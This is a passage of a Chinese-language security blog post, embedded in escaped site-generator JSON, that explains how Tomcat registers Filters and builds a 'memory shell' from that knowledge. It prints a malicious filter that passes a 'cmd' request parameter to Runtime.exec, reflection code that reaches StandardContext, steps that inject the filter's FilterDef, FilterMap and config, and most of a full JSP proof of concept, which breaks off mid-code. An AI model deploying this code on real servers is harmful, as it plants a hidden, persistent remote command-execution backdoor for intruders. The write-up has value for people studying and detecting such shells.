4.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628152359316.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628153200124.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-28%20213052.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628213910446.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628233938672.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":4.03,"words":1209},"filePathRelative":"Java学习/内存马/Tomcat/Filter.md","localizedDate":"2025年1月16日","excerpt":"\\n<p>在Tomcat架构中Filter在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式</p>\\n<p>使用 ServletContext 的 addFilter/createFilter 方法注册；</p>\\n<p>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</p>\\n<p>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）</p>\\n<ul>\\n<li>\\n<p>ServletContext 的 addFilter/createFilter 注册</p>\\n<p><strong>ServletContext#creatFilter</strong></p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div><p>这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 ServletContextListener.contextInitialized 方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 javax.servlet.annotation.WebListener 进行注释，则会抛出 UnsupportedOperationException 异常</p>\\n<p><strong>ApplicationContext#addFilter()</strong></p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/屏幕截图 2024-06-28 141113.png\\" alt=\\"屏幕截图 2024-06-28 141113\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>屏幕截图 2024-06-28 141113</figcaption></figure>\\n<p>该方法创建了一个FilterDef对象，将fiterName,filterClass,filter对象初始化进去，使用 StandardContext 的 <code>addFilterDef</code> 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回</p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628143033976.png\\" alt=\\"image-20240628143033976\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628143033976</figcaption></figure>\\n<p>需要注意的是，这个方法并没有将这个Filter放入到FilterChain中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p>\\n<p><strong>Tomcat如何处理一次filterchain请求</strong></p>\\n<p>我们可以先实现一个恶意的filter进行调试</p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628144641398.png\\" alt=\\"image-20240628144641398\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628144641398</figcaption></figure>\\n<p><strong>ApplicationFilterChian#internalDoFilter()</strong></p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628150352284.png\\" alt=\\"image-20240628150352284\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628150352284</figcaption></figure>\\n<p>调用filter.Filter(),filter来自</p>\\n<div class=\\"language-java line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"java\\" data-title=\\"java\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">Filter</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> filter </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\"> filterConfig</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">getFilter</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">();</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">--</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">-</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    ApplicationFilterConfig</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> filterConfig </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\"> this</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">filters</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#E06C75\\">[</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">this</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">pos</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">++</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#E06C75\\">]</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>filterConfig来自于一个filters数组，跟进到该数组赋值的位置</p>\\n<p><strong>StandardWrapperValue#invoke</strong></p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628152359316.png\\" alt=\\"image-20240628152359316\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628152359316</figcaption></figure>\\n<p>调用了ApplicationFilterFactory#creatFilterChain方法</p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628153200124.png\\" alt=\\"image-20240628153200124\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628153200124</figcaption></figure>\\n<p>这个函数流程如下</p>\\n<ul>\\n<li>在context中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配</li>\\n<li>在context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig</li>\\n<li>获取到 filterConfig，则将其加入到 filterChain 中</li>\\n<li>继续循环，直至添加所有匹配的filter</li>\\n</ul>\\n<p>根据上述流程，我们知道要动态注册一个filter我们需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig</p>\\n<p>在ApplicationFilter#addfilter()中，将初始化的filter放入StandardContext的filterDefs中，来看下另外两个参数是如何生成并添加的</p>\\n<p><strong>StandardContext#filterStart()</strong></p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/屏幕截图 2024-06-28 213052.png\\" alt=\\"屏幕截图 2024-06-28 213052\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>屏幕截图 2024-06-28 213052</figcaption></figure>\\n<p><strong>ApplicationFilterRegistration#addMappingForUrlPatterns()</strong></p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628213910446.png\\" alt=\\"image-20240628213910446\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628213910446</figcaption></figure>\\n<p>如图添加了filtermap</p>\\n<p>至此我们的思路是</p>\\n<ul>\\n<li>获取StandardContext对象</li>\\n<li>创建恶意Filter</li>\\n<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>\\n<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>\\n<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>\\n</ul>\\n<p>首先获取当前环境中StandardContext的上下文，封装在ApplicationContext方法中</p>\\n<p>通过jsp自带的request方法获取到ApplicationContextFaced类，再通过反射获取到封装的StandardContext</p>\\n<div class=\\"language-jsp line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"jsp\\" data-title=\\"jsp\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;%</span></span>\\n<span class=\\"line\\"><span>    //获取ApplicationContextFaced类</span></span>\\n<span class=\\"line\\"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>\\n<span class=\\"line\\"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>\\n<span class=\\"line\\"><span>    Field appContext = servletContext.getClass().getDeclaredField(\\"context\\");</span></span>\\n<span class=\\"line\\"><span>    appContext.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>\\n<span class=\\"line\\"><span>    //获取StandardContext</span></span>\\n<span class=\\"line\\"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(\\"context\\");</span></span>\\n<span class=\\"line\\"><span>    stdContext.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>创建一个恶意filter</p>\\n<div class=\\"language-jsp line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"jsp\\" data-title=\\"jsp\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;%!</span></span>\\n<span class=\\"line\\"><span>    public class TestFilter implements Filter {</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>        @Override</span></span>\\n<span class=\\"line\\"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>\\n<span class=\\"line\\"><span>            String cmd = servletRequest.getParameter(\\"cmd\\");</span></span>\\n<span class=\\"line\\"><span>            if(cmd != null ){</span></span>\\n<span class=\\"line\\"><span>                try {</span></span>\\n<span class=\\"line\\"><span>                    Runtime.getRuntime().exec(cmd);</span></span>\\n<span class=\\"line\\"><span>                } catch (IOException e) {</span></span>\\n<span class=\\"line\\"><span>                    e.printStackTrace();</span></span>\\n<span class=\\"line\\"><span>                } catch (NullPointerException n) {</span></span>\\n<span class=\\"line\\"><span>                    n.printStackTrace();</span></span>\\n<span class=\\"line\\"><span>                }</span></span>\\n<span class=\\"line\\"><span>            }</span></span>\\n<span class=\\"line\\"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>\\n<span class=\\"line\\"><span>        }</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>封装filterDef</p>\\n<div class=\\"language-jsp line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"jsp\\" data-title=\\"jsp\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;%</span></span>\\n<span class=\\"line\\"><span>    shellFilter shellFilter = new shellFilter();</span></span>\\n<span class=\\"line\\"><span>    String name = \\"shellfilter\\";</span></span>\\n<span class=\\"line\\"><span>    FilterDef filterDef = new FilterDef();</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilter(shellFilter);</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilterName(name);</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));</span></span>\\n<span class=\\"line\\"><span>    standardContext.addFilterDef(filterDef);</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>创建filtermap</p>\\n<div class=\\"language-java line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"java\\" data-title=\\"java\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    FilterMap</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> filterMap  </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#A626A4;--shiki-dark:#C678DD\\"> new</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\"> FilterMap</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#E06C75\\">()</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">;</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    filterMap</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">setFilterName</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(name);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    filterMap</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">addURLPattern</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"/*\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    filterMap</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">setDispatcher</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">DispatcherType</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">REQUEST</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">name</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">());</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    standardContext</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">addFilterMap</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(filterMap);</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>获取filterConfigs并将filterDef添加</p>\\n<div class=\\"language-java line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"java\\" data-title=\\"java\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\">    //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    Field</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> fieldconfigs </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\"> standardContext</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">getClass</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">().</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">getDeclaredField</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">\\"filterConfigs\\"</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    fieldconfigs</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">setAccessible</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\">true</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    Map</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> filterConfigs </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#E06C75\\"> (Map) </span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">fieldconfigs</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">get</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(standardContext);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\">        //获取构造函数</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    Constructor</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> constructor </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\"> ApplicationFilterConfig</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">class</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">getDeclaredConstructor</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">Context</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">class</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">,</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">FilterDef</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">class</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    constructor</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">setAccessible</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\">true</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">);</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#C18401;--shiki-dark:#E5C07B\\">    ApplicationFilterConfig</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\"> filterconfig </span><span style=\\"--shiki-light:#383A42;--shiki-dark:#56B6C2\\">=</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#E06C75\\"> (ApplicationFilterConfig) </span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">constructor</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">newInstance</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(standardContext,filterDef);</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#E45649;--shiki-dark:#E5C07B\\">    filterConfigs</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">.</span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">put</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">(name,filterconfig);</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><p>完整poc</p>\\n<div class=\\"language-jsp line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"jsp\\" data-title=\\"jsp\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;%--</span></span>\\n<span class=\\"line\\"><span>  Created by IntelliJ IDEA.</span></span>\\n<span class=\\"line\\"><span>  User: uu2fu3o</span></span>\\n<span class=\\"line\\"><span>  Date: 2024/6/28</span></span>\\n<span class=\\"line\\"><span>  Time: 22:08</span></span>\\n<span class=\\"line\\"><span>  To change this template use File | Settings | File Templates.</span></span>\\n<span class=\\"line\\"><span>--%&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page contentType=\\"text/html;charset=UTF-8\\" language=\\"java\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.core.ApplicationContext\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.lang.reflect.Field\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.core.StandardContext\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.io.IOException\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.tomcat.util.descriptor.web.FilterDef\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.tomcat.util.descriptor.web.FilterMap\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.core.ApplicationFilterConfig\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.util.Map\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.lang.reflect.Constructor\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.Context\\" %&gt;</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>&lt;%</span></span>\\n<span class=\\"line\\"><span>    //获取ApplicationContextFaced类</span></span>\\n<span class=\\"line\\"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>\\n<span class=\\"line\\"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>\\n<span class=\\"line\\"><span>    Field appContext = servletContext.getClass().getDeclaredField(\\"context\\");</span></span>\\n<span class=\\"line\\"><span>    appContext.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>\\n<span class=\\"line\\"><span>    //获取StandardContext</span></span>\\n<span class=\\"line\\"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(\\"context\\");</span></span>\\n<span class=\\"line\\"><span>    stdContext.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%!</span></span>\\n<span class=\\"line\\"><span>    public class shellFilter implements Filter {</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>        @Override</span></span>\\n<span class=\\"line\\"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>\\n<span class=\\"line\\"><span>            String cmd = servletRequest.getParameter(\\"cmd\\");</span></span>\\n<span class=\\"line\\"><span>            if(cmd != null ){</span></span>\\n<span class=\\"line\\"><span>                try {</span></span>\\n<span class=\\"line\\"><span>                    Runtime.getRuntime().exec(cmd);</span></span>\\n<span class=\\"line\\"><span>                } catch (IOException e) {</span></span>\\n<span class=\\"line\\"><span>                    e.printStackTrace();</span></span>\\n<span class=\\"line\\"><span>                } catch (NullPointerException n) {</span></span>\\n<span class=\\"line\\"><span>                    n.printStackTrace();</span></span>\\n<span class=\\"line\\"><span>                }</span></span>\\n<span class=\\"line\\"><span>            }</span></span>\\n<span class=\\"line\\"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>\\n<span class=\\"line\\"><span>        }</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%</span></span>\\n<span class=\\"line\\"><span>    shellFilter shellFilter = new shellFilter();</span></span>\\n<span class=\\"line\\"><span>    String name = \\"shellfilter\\";</span></span>\\n<span class=\\"line\\"><span>    FilterDef filterDef = new FilterDef();</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilter(shellFilter);</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilterName(name);</span></span>\\n<span class=\\"line\\"><span>    filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));</span></span>\\n<span class=\\"line\\"><span>    